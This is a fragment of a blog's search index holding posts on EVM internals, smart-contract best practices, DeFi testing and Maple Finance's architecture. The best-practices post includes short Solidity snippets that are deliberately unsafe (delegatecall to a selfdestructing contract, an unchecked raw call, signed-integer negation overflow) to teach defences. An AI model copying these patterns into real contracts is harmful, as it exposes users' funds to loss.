SMOD //Signed modulo operation ADDMOD //Addition modulo any number MULMOD //Multiplication modulo any number EXP //Exponential operation SIGNEXTEND //Extend the length of a two&#39;s complement signed integer SHA3 //Compute the Keccak-256 hash of a block of memory . Note All arithmetic is performed modulo 2256 (unless otherwise noted), and the also 00 is taken to be 1. . Stack Operations | POP //Remove the top item from the stack MLOAD //Load a word from memory MSTORE //Save a word to memory MSTORE8 //Save a byte to memory SLOAD //Load a word from storage SSTORE //Save a word to storage MSIZE //Get the size of the active memory in bytes PUSHx //Place x byte item on the stack, where x can be any integer from // 1 to 32 (full word) inclusive DUPx //Duplicate the x-th stack item, where x can be any integer from // 1 to 16 inclusive SWAPx //Exchange 1st and (x+1)-th stack items, where x can be any // integer from 1 to 16 inclusive . Process Flow Operations | STOP //Halt execution JUMP //Set the program counter to any value JUMPI //Conditionally alter the program counter PC //Get the value of the program counter (prior to the increment corresponding to this instruction) JUMPDEST //Mark a valid destination for jumps . System Operations | LOGx //Append a log record with x topics, where x is any integer //from 0 to 4 inclusive CREATE //Create a new account with associated code CALL //Message-call into another account, i.e. run another //account&#39;s code CALLCODE //Message-call into this account with another //account&#39;s code RETURN //Halt execution and return output data DELEGATECALL //Message-call into this account with an alternative //account&#39;s code, but persisting the current values for //sender and value STATICCALL //Static message-call into an account REVERT //Halt execution, reverting state changes but returning //data and remaining gas INVALID //The designated invalid instruction SELFDESTRUCT //Halt execution and register account for deletion . Logic Operations | LT //Less-than comparison GT //Greater-than comparison SLT //Signed less-than comparison SGT //Signed greater-than comparison EQ //Equality comparison ISZERO //Simple NOT operator AND //Bitwise AND operation OR //Bitwise OR operation XOR //Bitwise XOR operation NOT //Bitwise NOT operation BYTE //Retrieve a single byte from a full-width 256-bit word . Environmental Operations | GAS //Get the amount of available gas (after the reduction for //this instruction) ADDRESS //Get the address of the currently executing account BALANCE //Get the account balance of any given account ORIGIN //Get the address of the EOA that initiated this EVM //execution CALLER //Get the address of the caller immediately responsible //for this execution CALLVALUE //Get the ether amount deposited by the caller responsible //for this execution CALLDATALOAD //Get the input data sent by the caller responsible for //this execution CALLDATASIZE //Get the size of the input data CALLDATACOPY //Copy the input data to memory CODESIZE //Get the size of code running in the current environment CODECOPY //Copy the code running in the current environment to //memory GASPRICE //Get the gas price specified by the originating //transaction EXTCODESIZE //Get the size of any account&#39;s code EXTCODECOPY //Copy any account&#39;s code to memory RETURNDATASIZE //Get the size of the output data from the previous call //in the current environment RETURNDATACOPY //Copy data output from the previous call to memory . Block Operations | BLOCKHASH //Get the hash of one of the 256 most recently completed //blocks COINBASE //Get the block&#39;s beneficiary address for the block reward TIMESTAMP //Get the block&#39;s timestamp NUMBER //Get the block&#39;s number DIFFICULTY //Get the block&#39;s difficulty GASLIMIT //Get the block&#39;s gas limit . Ethereum State . The job of the EVM is to update the Ethereum state by computing valid state transactions as a result of smart contract code execution. Therefore, Ethereum can be considered a transaction-based state machine since external actors (ie account holders and miners) initiate state transitions by creating, accepting and ordering transactions. . At the top level, we have the Ethereum world state. The world state is a mapping of Ethereum addresses (160-bit values) to accounts. At the lower level, each Ethereum address represents an account comprising an Ether balance, a nonce (reps the number of txn successfully if EOA or the number of contracts created, if a contract), the account’s storage, and account’s code. An EOA will always have no code and an empty storage. . For a transaction resulting in a smart contract code execution, you can think of the EVM running on a sandboxed copy of the Ethereum world state, with this sandboxed version being discarded completely if execution cannot complete for whatever reason (Eg OOG exception). However if the execution does complete successfully, then the real-world state is updated to match the sandboxed version, including any changes to the called contract’s storage data, any new contracts created, and any ether balance transfers that were initiated. . Note Gas is deducted even in cases of failed execution, because as the code exection progresses, the gas gas supply is reduced according to the gas cost of the operations executed. If at any point the gas supply is reduced to zero we get an “Out of Gas” (OOG) exception; execution immediately halts and the transaction is abandoned. No changes to the Ethereum state are applied, except for the sender’s nonce being incremented and their ether balance going down to pay the block’s beneficiary for the resources used to execute the code upto the halting point. . A contract can call other contracts, with each call resulting in another EVM being instantiated around the new target of the call. Each instantiation has its sandbox world state initialized from the sandbox of the EVM at the level above. . Compiling Solidity to EVM Bytecode . This section basically explains how the opcodes are arranged in stack and how they operate. Things like DUP1, PUSH1, JUMPI, EQ, LT, MLOAD etc are used to demonstrate how a program is executed in the EVM. . Note There is an important but subtle difference between the code used when creating and deploying a new contract on the Ethereum platform and the code of the contract itself. In order to create a new contract, a special transaction is needed that has its to field set to the special 0x0 address and its data field set to the contract’s initiation code. When such a contract creation transaction is processed, the code for the new contract account is not the code in the data field of the transaction. Instead, an EVM is instantiated with the code in the data field of the transaction loaded into its program code ROM, and then the output of the execution of that deployment code is taken as the code for the new contract account. This is so that new contracts can be programmatically initialized using the Ethereum world state at the time of deployment, setting values in the contract’s storage and even sending ether or creating further new contracts. . To get examples on this, the ethereum mastery book is good. . And an awesome resource to pick up how EVM opcode works is this presentation from Ethereum Engineering Group . PS: I made some notes from this YT talk. You can see them here . Turing Completeness and Gas . We have already discussed how the Ethereum Virtual Machine is a quasi-Turing-complete machine since it solves the halting problem. . One more interesting point to note is what happens when a (apparently rich af) attacker supposedly offers infinite gas and asks the EVM to do infinite computations? Well, if after a prespecified maximum amount of computation has been performed, the execution hasn’t ended, the execution of the program is halted by the EVM. That limit isn’t fixed in Ethereum—you can pay to increase it up to a maximum (called the “block gas limit”), and everyone can agree to increase that maximum over time. Nevertheless, at any one time, there is a limit in place, and transactions that consume too much gas while executing are halted. . Gas . Gas is the cost to for on-chain computation and storage. . Each operation performed by a transaction or contract costs a fixed amount of gas. Example: . Addition costs 3 gas | Keccak-256 costs 30 gas + 6 gas for each 256 bits of data being hashed | Sending a transaction costs 21,000 gas | Gas serves two purposes: . Prevents DoS attacks, first by making it financially infeasible and then asking the tx.origin to set a limit to the gas they are willing to pay. | Providing reward to miners (as a hedge against volatile ETH prices) | Gas Accounting During Execution . In the first instance, the EVM is provided with the gas supply equal to the amount specified by the gas limit, and all steps that can be performed with that amount of gas, are performed. . If all the steps were performed, any remaining gas is sent to the sender in form of Ether . refunded ether = remaining gas * gas price . And in either case, the miner gets paid (in ether) because the computations were done in both cases . miner fee = gas cost * gas price . Gas Accounting Considerations . The objective is matching gas cost of transactions to the real-world cost of resources. . Gas Cost vs Gas Price . Gas cost is the number of units of gas required to perform a particular operation. . | Gas price is the amount of ether you are willing to pay per unit of gas when you send your transaction to the Ethereum network. . | . Negative Gas Costs (Refund) . Deleting a contract (SELFDESTRUCT) is worth a refund of 24,000 gas. . | Changing a storage address from a nonzero value to zero (SSTORE[x] = 0) is worth a refund of 15,000 gas. . | . Block Gas Limit . The block gas limit is the maximum amount of gas that may be consumed by all the transactions in a block, and constrains how many transactions can fit into a block. . The block gas limit on the Ethereum mainnet is 8 million gas at the time of writing according to https://etherscan.io, meaning that around 380 basic transactions (each consuming 21,000 gas) could fit into a block. . Decisions regarding block gas limit . The miners on the network collectively decide the block gas limit. Individuals who want to mine on the Ethereum network use a mining program, such as Ethminer, which connects to a Geth or Parity Ethereum client. The Ethereum protocol has a built-in mechanism where miners can vote on the gas limit so capacity can be increased or decreased in subsequent blocks. The miner of a block can vote to adjust the block gas limit by a factor of 1/1,024 (0.0976%) in either direction. The result of this is an adjustable block size based on the needs of the network at the time. This mechanism is coupled with a default mining strategy where miners vote on a gas limit that is at least 4.7 million gas, but which targets a value of 150% of the average of recent total gas usage per block (using a 1,024-block exponential moving average). . ` End of Ethereuem Book ` . Femboy Capital (Definitely not as detailed as the Ethereum book) . Will only include small piece of information from this source which add more clarity to already discussed topics or something that might have been missing above. . The EVM keeps track of the specific section of the bytecode it is currently executing with a pointer called the Program Counter (PC) | A VM execution loop looks something like this: Fetch the instruction the PC points to | Execute the instruction | If the instruction jumps, set the PC to the new target | Otherwise, increment the PC | . | The stack can accomodate a maximum of 1024 elements and each element (word) being 256 bits long | This is a good image to visualize memory and storage inside of Ethereum | . . And this image is a good way to visualize how programs are executed in the EVM: | . . Storage in the EVM operates as a map of 32 byte keys to 32 byte values. It is persistent, meaning that the current storage state sticks around even after contract exectuion completes (STOP or RETURN is called). Any subsequent runs of a contract will have read and write access to the same storage space. There is no opportunity for data races because the EVM does not currently support concurrent execution of a single contract - all transactions are executed sequentially. . | SSTORE cost a whopping 22100 gas! SLOAD cost 100. Reading and writing to storage is very expensive. . | . WIP . About Yul (picked from documentation itself) . Yul provides for loops, if and switch statements | No explicit statements for SWAP, DUP, JUMPDEST, JUMP and JUMPI are provided (as they obfuscate data flow and control flow) | Statements such as mul(add(x, y),z) are preferred over 7 y x add mul, because it becomes easier to see which opcode is being used for which operand | Yul is desigend for a stack based machine (EVM) but it does not expose the programmer to the complexity of the stack itself | Yul is statically typed, but also there is a default type (integer word of the target machine) that can be omitted. | Yul does not have any built-in operations, functions or types in its pure form. 6.1 There exists only one specified dialect of Yul (EVM dialect) and that uses the EVM opcodes as builtin functions and defines only the type u256 (native 256-bit type of EVM) |",
            "url": "https://saxenism.com/evm/solidity/security/deep-dive/evm-internals/2022/08/29/All-About-EVM.html",
            "relUrl": "/evm/solidity/security/deep-dive/evm-internals/2022/08/29/All-About-EVM.html",
            "date": " • Aug 29, 2022"
        }
        
    
  
    
        ,"post7": {
            "title": "Smart Contract Development - Best Practices",
            "content": "General Contract Development Guidelines (Best Practices) . Smart contract programming requires a different engineering mindset than what you may be used to. . The cost of failure is high and changes can be difficult, making it in some ways similar to hardware programming or financial services programming rather than web or mobile app development. . It is therefore not enough to defend against known vulnerabilities. Instead you will need to learn a new philosophy of development. . Prepare for Failure . Place circuit breakers | Manage money at risk (rate limiting, maximum usage,etc) | Effective mechanism for proxy upgrades | . Stay up to Date . Check your contracts for any new bug as soon as it is discovered | Keep on upgrading all tools and libraries | Adopt new security techniques that emerge (and seem useful) | . Keep it simple . Keep contract logic simple. Modularize code. Use already written code, use as many lego blocks as you can, before writing custom logic | Clarity over performance (Debatable) For example one could argue that the OpenSea Seaport contract is so damned performant that it affects the auditability of the contracts. But realise the fact that the Seaport contract will be deployed on the Ethereum mainnet and will be used to mint hundereds of thousands of NFTs, saving the users millions of dollars over the course of time. . So, based on the nature of your contract, do have healthy, sane discussions on whether you will place more impetus on performance or clarity. . | Roll out in phases. Have a bug bounty in place, test your code-base thoroughly and immediately add relevant tests to your codebase as soon as a new attack is discovered. | . Blockchain Properties . Randomness can be gamified. | Timestamps are imprecise. Miners can influence the time of execution of a txn within a margin of several seconds | Beware of external calls. Private data is not actually private and public functions can be called by anyone in any order. | Prefer reusing contract code only when you have proven previously-deployed contracts which you own. Otherwise go for duplication of code. Efforts such as OpenZeppelin’s Solidity Library seek to provide patterns such that secure code can be re-used without duplication . | . Development best practices: . External Calls . External calls are very risky. Try and avoid doing that, prefer duplicating code over using a call to an external contract. | And when you absolutely have to do that, make sure that the contract is owned/maintained/managed by a trusted party. | Always mark your function making external calls as unsafe via comments and naming convention | Avoid making state changes after the external call. The usual re-entrancy attack and following the check-effects-interactions pattern circus. | . | Prefer call over transfer and send. transfer and send forward exactly 2300 gas to the recipient. This was done to limit the reentrancy vulnerability. However, post the Instanbul hard fork, the cost of SLOAD operation was increased and it made it quite possible that 2300 gas might not be enough for the contract to carry out the logic in its fallback function | But with the same fact, we also have a benefit here that, these methods can act as a filter to ensure that only EOA’s can call the withdraw function instead of contracts. | Therefore, it is a matter of design choice rather than a best practice in this case. | . | A disadvantage of using call is that it does nothing to mitigate the reentrancy attack and that attack has to be handled separately. | . | For low-level call methods(call, callcode, delegatecall), always handle the case of your call failing by checking the return value. | . Example: . someAddress.call.value(100)(bytes(sha3(&quot;deposit()&quot;))); // If deposit throws an exception, the raw call() will only return false and transaction will NOT be reverted . Avoid combining multiple ether transfers in a single transaction. Favor pull over push for external calls. . | delegatecall is made by the caller contract to a callee as if the callee was the same contract. Therefore, we must remain vigilant with delegatecall as it can modify the state of the caller contract. . | . Example: . contract OneBeingCalled { function doSomeGoodWork() external { selfdestruct(0); } } contract OneWhoCalled { function outsourceSomeGoodWork(address _callee) public { _callee.delegatecall(bytes4(keccak256(&quot;doSomeGoodWork()&quot;))); } } . Force Feeding Ether . Do not rely on address(this).balance for your contract logic because it is possible to force send Ether to any contract. . | The contract can implement a fallback function that does a revert, but it will not be able to stop these three method of force sending Ether: . Attacker creates a contract, funds it and calls selfdestruct(victimAddress) | Attacker is a miner, wins some block reward and redirects the award to your address | Attacker pre-computes your contract address and sends some Ether to it even before the victim contract is deployed. | . | . Public on-chain Data . Applications like On Chain Rock-Paper-Scissors require submitted data (player’s move) to be private until some point in time in order to work. . | The best strategy to use here is to use commitment scheme with separate phases: commit phase and then the reveal phase (and then the distribute phase if that is required). . | If you have a distribute phase in your contract logic it would make sense to include a bond from all involved parties. . | Also, don’t implement your own random number generator. Ethereum is a deterministic protocol, so no variable within this protocol can be used as an unpredictable random number. Miners can influence the block.blockhash() value . | Will create a sample contract for an on-chain game of rock-paper-scissors to demonstrate the commit-reveal-distribute method. | . Unreliable Participants . Your contract should not rely on a party to act a certain way for the entire contract logic to play out. For example, in the earlier discussed rock-paper-scissor game, if player 1 decides to submit their hashed move and bet money plus bond money and then player 2 decides to not submit their move at all. It is possible that according to your contract’s logic player1’s money is locked until the game is completed. We need to avoid such situations | . | If circumventing an actor’s willingness to comply for a contract logic to play out is not feasible, try to incentivize them by providing either economic incentives or time constraints (locks). | . Negation of signed integers . Signed integers in Solidity range from 2^(N-1) to 2^(N-1)-1. That means there is no positive equivalence for the INT_MIN. . Observe the below contract: . // SPDX-License-Identifier: MIT pragma solidity 0.8.7; contract Negation { function negateInt8(int8 num) public pure returns(int8) { return -num; } function negateInt16(int16 num) public pure returns(int16) { return -num; } int8 public a = negateInt8(-128); // -128 int16 public b = negateInt16(-256); // 256 int public c = negateInt16(-32768); // -32768 } . So, when dealing with int in Solidity it is important to keep a check to see whether the negation does not return the same number. . To counter this, we can: . Check value of variable before negation and throw if it is INT_MIN | Or try using integers of higher capacity. Example: int16 instead of int8. | . Precautions . General . Shit happens and even after your best efforts, your contract could fail. . Therefore, architect your contracts in a way that allows them to fail gracefully, and with minimal damage. . . Always be mindful of even the fail-safe mechanisms you add, because even they or their interaction among themselves can become a vulnerability Upgradeability . This is important to fix a bug when discovered or do something after freezing the assets inside of the contract. . You should implement emergency stop or circuit breakers into the contract code along with mechanism to upgrade the contract. This is because, if you need to reach a consensus for upgrading the contracts, till that time, the funds should remain safe. . Use a registry contract to store the latest version of a contract . Calls are not forwarded. Users fetch the current address each time before interacting with it. . | Few disadvantages: . Porting the existing data to the new contract would be difficult. | You HAVE to make sure that a user NEVER uses anything but the most updated set of contracts, which again can be a bit difficult. | . | . Use a DELEGATECALL to forward data and calls . When you use delegatecall from the caller contract to the called contract, the storage, current address and balance still refer to the calling contract, only the code is taken from the called address. . There are a lot of ways of implementing this, for more information, read the post of Upgradation in my website. .",
            "url": "https://saxenism.com/markdown/smart-contract/solidity/security/development/best-practices/2022/08/28/General-Contract-Development-Guidelines.html",
            "relUrl": "/markdown/smart-contract/solidity/security/development/best-practices/2022/08/28/General-Contract-Development-Guidelines.html",
            "date": " • Aug 28, 2022"
        }
        
    
  
    
        ,"post8": {
            "title": "DeFi TITS - A Primer on Testing",
            "content": "The International Testing Standard (TITS) for DeFi . DeFi Testing is broken. Doesn&#39;t matter how many auditors had a stab at your protocol, if you haven&#39;t sufficiently tested your protocol, you are basically gambling with your user&#39;s funds. Creating a repo to publicly critique the quality of the test suite of major DeFi protocols. . &mdash; Rahul Saxena (@saxenism) July 27, 2022 Mission Statement . I believe that protocols need to be held to a higher standard of testing. Web3 protocols are decentralised, therefore there are no centralised authorities, and subsequently there is no regulatory pressure on the protocols to do quality checks on their protocols. . Is this an issue? YES Is this a big issue?YES . Why? . Well, because, speaking strictly from an economic perspective, it makes much more sense for a protocol to use its time and developer resources on shipping a v2 of their protocol once the initial set of smart contracts are coded rather than spending it on testing their protocol. The protocols presently, try to, conviniently shift the burden of testing and quality assurance on the auditing firms and sometimes on insurance firms. However, Auditing + Insurance is still not enough to offer the level of peace of mind that people should have on software that handles their money. . Therefore, the development team, that is the most intimately familar with the code base, must make it a sacred duty of theirs (just like doctors take the Hippocratic Oath) to test their code to the best of knowledge and ability. . All in all, these softwares (DeFi protocols) handle the hard earned money of everyday Joes like you and me (and also money of stupid funds like 3AC, but yeah, you get the point) so, we cannot let the protocols continue with lax testing, because not everything can and should be viewed with an economic lens, somethings should exist simply because of personal or community ethics. . It does not matter (much) how many auditors have had a stab at your protocol, you, as a developer, do not really understand if your protocol really works and is robust enough to take on the uncertainities of the real world if you have not tested your protocol thoroughly. . Therefore, with this repository, I aim to create a certain set of testing standards that all DeFi protocols should strive to meet. . I plan to create this set of standards via iterations. Iterations of publicly critiquing leading DeFi protocols that are in use today, so that the up and coming protocols in the same space can get an idea and inspiration for the level of testing that the entire community expects out of a protocol that claims to handle money. . List of protocols being evaluated . Maple Finance | Random tid bits about traditional testing that I have picked up… . This is definitely not molded for web3 yet, but consider this a good starting point if you haven’t formally studied Software Engineering. . Testing of software is an extremely imaginative and cognitively demanding task, more so in DeFi. So let your imagination go wild and gather ideas regarding testing from any walk of life, science, religion, parenting, social sciences, etc. Just about everything is fair game in testing. . 1. Old wisdom related to testing . 1.1 Presence of bugs . Testing can esure that defects are present but it cannot prove that a particular software is bug-free. Which isn’t something super nice, but I’m coping too. . 1.2 None can do exhaustive testing . Your software can never be tested for every imaginable and possible test cases. Trust me fellow crypto bro, you cannot. . 1.3 Test Early . Earlier you test, lesser you’ll cry. . 1.4 Defect Clustering . Pareto principle but for origin of software bugs. . 1.5 Pesticide Paradox . Don’t be an idiot and test the same thing over and over with different methods. Find novel ways to screw with your protocol. . 1.6 Testing is context-dependent . Every protocol does something special. Test the shit out of that. . 1.7 Absence of errors fallacy . Just like your hot and caring girlfriend, a 100% bug-free software exists only in your imagination. . 1. Why testing is important . Saves you and your users from getting rekt. | Hoping for your protocol’s success without adequate testing is like going into a gunfight without a bulletproof vest and hoping you don’t get shot. | Time and effort spent on testing can be leveraged to get better terms when you get your protocol insured. | In short, you’ll get your lambo only wen you test. | . Thank you for coming to my TED talk. Bye. . Types of testing . Functional and Non Functional . Non Function includes . Testing the Documentation (which includes) Instructions | Examples | Messages | Samples | . | Installation Testing | Performance Testing Load Testing | Spike Testing | Stress Testing | Endurance Testing | . | Reliability Testing Feature Testing | Regression testing | Load Test | Objectives Testing | . | Security Testing (web2 stuff) Access to application | Data Protection | Brute FOrce | SQL Injection | Service Point | Session Management | Error Handling | Specific Risky Functionalities | . | . 2. SDLC . Requirement | Analysis (outcome from this phase is SRS) | Design (HLD and LLD) | Coding | Testing | Deployment and all | . 2.1 Waterfall Model . Sequential design process. One way street, so back tracking is not possible. . . 2.2 Spiral Model . Combination of iterative development process model and sequential linear development model. . . 3. Validation vs Verification . Verification Validation . Methods involve: review, inspection, unit testing &amp; integration testing | Involves testing the entire system (system testing) | . Usually done by developers while developing | Usually done by tester and after developing of the product by developers | . Concerned with the phase containment of errors | Concerned with making the final product error free | . Involves static and dynamic analysis of code | Involves only dynamic analysis of code | . 4. Types of software testing . 4.1 Unit Testing . Can be done in the development phase itself. Unit means a particularly small piece of (preferrably independent) code such as a function, small module etc. . Smallest element of the software is a unit and testing each of those units is unit testing. . 4.2 Integration Testing . Combine different units of code and test whether they work together as expected to produce the desired output or not. . 4 common integration testing startegies are as follows: . 4.2.1 Big Bang Testing . All units are linked at once, resulting in a complete system. Here, it is difficult to isolate any errors found. . 4.2.2 Top Down . Higher level modules are tested first after which the lower level modules are tested. Higher level modules refer to the main modules and lower level refers to the sub modules. . Stubs (temporary modules) are used to simulate the behaviour of the lower-level modules that are not yet integrated. . Used when software needs to interact with an external system. . 4.2.3 Bottom Up . Lower level modules are tested first and then the higher level modules. . This approach uses test drivers which are mainly used to initiate and pass the required data to the sub modules, implying we pass mock data that should ideally have come from (the not yet implemented) higher modules. . 4.2.4 Mixed (Sandwiched integration testing) . A mixed integration testing follows a combination of top down and bottom-up testing approaches. . 4.3 System Testing or End-to-End Testing . Testing the entire system. Here, we navigate all the necessary modules of an application and check if the end features or the end business works fine, and test the product as a whole system. . 4.3.1.1 Alpha Testing . The testers are people who have built the product. | Done before releasing the product. | Involves both white box and black box testing | . 4.3.1.2 Beta Testing . Beta testing is performed by a select set of clients who are not part of the organization. | User input on the product is collected to ensure the product is ready for real time users | Commonly involves only black box testing | . 4.3.2 Acceptance Testing . It is a formal testing according to user needs, requirements and business processes conducted to determine whether a system satisfies the acceptance criteria or not and to enable the users, customers or other authorized entities to determine whether to accept the system or not. . Smoke Testing or Build Verification Testing . Subset of acceptance testing | . Smoke Testing Sanity Testing . Smoke testing is done to assure that the acute functionalities of program is working fine. | Sanity testing is done to check the bugs have been fixed after the build. | . Smoke testing is documented. | Sanity testing isn’t documented. | . Smoke testing is done to measures the stability of the system/product by performing testing. | Sanity testing is done to measures the rationality of the system/product by performing testing. | . Smoke testing can be performed either manually or by using automation tools. | Sanity testing is commonly executed manually, not by using any automation approach. | . Smoke testing is used to test all over function of the system/product. | Sanity testing is used in the case of only modified or defect functions of system/products. | . Smoke testing is performed when new product is built. | Sanity testing is conducted after the completion of regression testing. | . 4.3.3 Mutation Testing . Type of white box testing | Extremely costly and time consuming but also extremely efficient in finding errors and ambiguities | In this type of testing, you slightly change the value/logic/statements in your code and see if you get the expected output in your tests | . 4.3.4 Performance / Non functional Testing . Non-functional testing is defined as a type of software testing to check non-functional aspects of a software application. It is designed to test the readiness of a system as per nonfunctional parameters which are never addressed by functional testing. . This testing tests the following things (among others): . Volume | Load | Stress | Security | Configuration | Compatibility (BrowserStack :P) | Recovery | Installation etc | . 4.3.5 Recovery Testing in Software Testing . Recovery testing is a type of system testing which aims at testing whether a system can recover from failures or not. | To ensure that a system is fault-tolerant and can recover well from failures, recovery testing is important to perform. | . 4.4 Regression Testing . Regression testing is the process of testing the modified parts of the code and the parts that might get affected due to the modification to ensure that no new errors have been introduced in the software after the modifications have been made. . 4.4.1 Techniques for the selection of test cases for regression testing . Select all test cases (Most thorough but inefficient approach) | Select test cases randomly (Dangerous approach) | Select modification traversing test cases (Huge upfront work required to identify these test cases) | Select higher priority test cases (Assign priority values to all your tests, then re-test all your highest priority tests) | . 4.4.2 Sanity Testing . Subset if regression testing | Done to ensure that the code changes that have been made are working properly or not | Focus of the team during sanity testing is to validate the functionality of the application and not detailed testing | Usually performed on builds where the production deployment is required immediately like a critical bug fix. | Performed only after the software product has passed the smoke test and the QA team has accepted for further testing | . 5. STLC (Software Testing Life Cycle) . Requirement Analysis (Truly truly understand what your protocol is supposed to do) | Test Planning / Strategy Phase (Based on the context of the protocol in question, zero in on a testing strategy) | Test Case Development (This should take the maximum amout of time. List down all test cases that you think are appropriate.) | Environment Setup (Independent of other stages) (Don’t tell me you don’t already have Forge installed) | Test Execution (Code up all the test cases you came up with earlier. You can do back and forth between Test Execution and Case Development phase, but try to keep it minimal) | Test Cycle Closure (Create a good report. Remember, chads keep their work presentable) | . 6. Non Functional Testing . This is based on customer expectations as opposed to functional testing which is based on customer requirements. | Non functional testing describes how the product works rather that what the product does | Includes things like performance testing, scalability, volume testing, load testing, stress testing etc. | . 6.1 Performace Testing . Ensures software application will perform well under their expected workload | Goal is not to find bugs but to elimiate performance bottle-necks | Provides accurate information about the speed, scalability and stability of the software | Types of performance testing types Load Testing (Multiple users access application simultaneously) | Stress Testing | Endurance Testing | Spiking Testing | Volume &amp; Scalability Testing | . | Pay attention to: Long load time | Poor response time | Poor scalability | Bottlenecking | . | Examples of performance Test cases: Verify response time is not more than 4 seconds when 1000 users access the website simultaneously | Check the maximum number of users that the application can handle before it crashes | Verify response time of the application under low, normal, moderate and heavy load conditions | . | . 6.2 Cross browser Tests and Mobile Testing and API Testing . See if this is applicable and test if you have the resources to do so. . Types of API Testing . Functionality Testing | Reliability Testing | Load Testing | UI/UX Testing | Interoperability Testing | Security Testing | Penetration Testing | Negative Testing | . 7. Agile Testing (Test Driven Development (TDD)) . Testing is continuous | Continuous Feedback | Decreased time of feedback response | Less documentation | Test Drive | Simplified Code | . . 7. Software Testing Documentation . 7.1 Test Plan . Provides the outline strategy which will be implemented for testing the application and also the resources that will be required. Test environement will also be described. . Make sure that you also set up a defect/bug life cycle . 7.2 Test Scenario . Notifies the area in which your application will experiment . 7.3 Test Case . Collected steps and conditions with inputs that can be implemented at the time of testing. . 7.4 Traceability Matrix . A table where you can relate test case IDs with protocol requirement IDs. . 8. Defect Management Process (What to do when you find bugs) . Detect the defect | Formulate the bug report | Fix bug | Bug list creation (so that, yk, history doesn’t repeat itself and everyone sees that you have 3 brain cells) | . It is important to note in the first two points, whenever you encounter a bug, you have to reach to the root cause of the bug and report that. Because, it is very much possible that the actual coding error that caused the bug might create many more bugs in the future. . In short, treat the root cause and not just the symptoms. . 9. When to choose manual testing . 9.1 Exploratory Testing . Carried out by domain experts. Minimal planning . 9.2 Usability Testing . User friendliness of an app . 9.3 Ad Hoc Testing . Informal testing. No documents are followed. . 9.4 How to do manual testing . Understand the requirements | Write the test cases | Conducting the tests | Log Good Bug Reports | Report the results (Detailed test report) | What to automate? . Repetitive Task | Capturing Results | Data Entry Tasks | Timing or Screening Responsiveness | Non functional Testing | Environment Setup/Tear down | . Approaches to Test Automation (Look them up) . Code driven Testing | Graphical User Interface | Framework Approach Linear Scripting framework | Data driven framework | Keyword driven framework | Modular testing framework | Hybrid Testing Framework | . | .",
            "url": "https://saxenism.com/defi/testing/web3/forge/defi-tits/2022/08/28/A-Primer-To-Testing.html",
            "relUrl": "/defi/testing/web3/forge/defi-tits/2022/08/28/A-Primer-To-Testing.html",
            "date": " • Aug 28, 2022"
        }
        
    
  
    
        ,"post9": {
            "title": "Maple Finance - An overview",
            "content": "Maple Finance: A brief overview . To get a detailed idea about Maple visit: . Maple Official Wiki . Brief Overview: Maple Finance . Decentralised corporate credit market protocol. Note This is a decentralised protocol but not trustless, since we always HAVE to assume Pool Delegates to be fair and non-malicious actors . | Borrowers can leverage their reputations to get undercollateralized loans over time. They do so by getting access to capital pools of different Pool Delegates after liaisoning with them. . | Interest Compounds: Interest is accrued and reinvested to enable capital to compound over time . | Pool Delegates carry out the entire due diligence. Lenders chill out. LPs (Lenders) earn revenue by claiming interest generated by the pool. . | Pool Delegates use Maple to attract funds, crack good deals with blue chip borrowers and then earn good performance fee. But they have to stake a good amount of MPL-USDC 50-50 BPTs (Balancer Pool Tokens) so that their incentives are aligned with the LPs. . | After agreeing on terms with a borrower, one or more Pool Delegates will fund the loan with funds available in their pools. . | Stakers are MPL holders and deposit BPT as first loss reserve against loan defaults. BPTs are burned to cover the shortfall after liquiditing the collateral of a borrower. . | Concept of ideal collateral ratio, grace period, late fee and liquidation post grace period exists. . | Governor is a multi-sig wallet that controls the administrative functions in the protocol (admin) . | Contract Instance Admins or local admins are admins for a particular task. Eg. These admins are set by: Governor in case of factories | Pool Delegate in case of a Pool | Borrower in case of a loan | . | Protocol Admin/Global Admin: Can call only one function, that pauses every outward facing function of the protocol. Called only when things have got really bad. | Maple Protocol Architecture . The architecture is pretty straightforward. Doesn’t need much explaining. . There is a Pool Factory, which will create Pools, which will be managed by Pool Delegates. Simple. Each pool will have a Liquidity Locker (created from its factory) to store the pool’s liquidity | Each pool will have a Debt Locker (created from its factory) to store the debt that is given out from that particular pool | Each pool will have a Stake Locker (created from its factory) for the Pool Delegate to stake their MPL-USDC BPT tokens. This is where the stakers would also stake their tokens. | Each pool will generate some MPL rewards as a result of this staking and will be distributed among the LPs. | . | Similarly there is a Loan factory, which will be used by Borrowers to create Loan requests(contracts). Simple Each loan will have a Collateral Locker (created from its factory) to store the borrower’s collateral | Each loan will have a Funding Locker (created from its factory) which I am not sure why it exists. Probably to store the repaid amount? IDK | . | Ofcourse Chainlink oracles are being used to fetch prices and execute functions dependent on price action. | . Security Considerations: . Pool Delegates are supposed to be trusted actors. Can’t really do anything if they turn out to be malicious. | dapp.tools (HEVM) has been used for extensive unit testing + fuzzing If you know anything James Bach, you’ll know that he’ll call this checking rather than actual testing. And this is what basically interests us here. . | External code audits by Deduab, PeckShield, TrailOfBits, Code4rena. | 2 week internal audit by the Maple team This kind of audit is often susceptible to developer biases. But it is complimented by external audits here… So, shouldn’t be much of an issue. Anyway, we are still more interested in testing rather than the auditing and the plethora of audit reports of Maple. . | OZ Defender is in use to inform of any emergencies. | Incase of a oracle outage, all transactions requesting asset prices will be reverted. Manual override possible. Hmm interesting claim. Will be fun to check this. . | Incase of emergencies, contract instance admins (local admins) and/or protocol admins/global admins will come into play. | Smart contract logic that is deployed on the mainnet cannot be altered in any way. Fuck proxies. This is good. Significantly reduces the surface area of possible attacks. . | Understanding Pools . If as a LP or staker you want to withdraw your funds, you’ll first have to trigger a cooldown function and wait for it get over before you can withdraw your funds or even cancel your staking as a staker. . In the following image it is not depicted properly, but the Pool Delegate also has to stake a shit ton of BPTs to be whitelisted as a Pool Delegate by the MapleDAO in the first place. . . Understanding Loans . The Loan contracts are created by Borrowers out of the LoanFactory contracts, which are whitelisted in MapleGlobals to ensure that only certain types of Loan contracts are used in the protocol. . | Loan contracts are used to: Set terms such as: | . APR, Payment Interval Length, Term Lenght, Collateral Ratio, Collateral and Borrow asset, etc. + Receiving capital from lenders + Withdrawing the loan + Interest Payments + Liquidating Collaterals | . | Important point to note is the use of Payment Calculators. These are used to calculate interest payments, late fees, premium fees etc. These are also whitelisted in the MapleGlobals to ensure no malicious payment calculators are used. | At first glance this looks like a whitelisted library which will be used for calculations based on the specifications of the loans, such as simple/compound interest. This also means that no calculation would be happening inside of the Loan contract . Need to check if these calculation libraries can somehow be tampered with. . A Loan can be funded by any number of pools, but those pools must be instantiated from PoolFactory contract itself. The LPs get LoanFDTs. | LoanFDTs are similar to LP 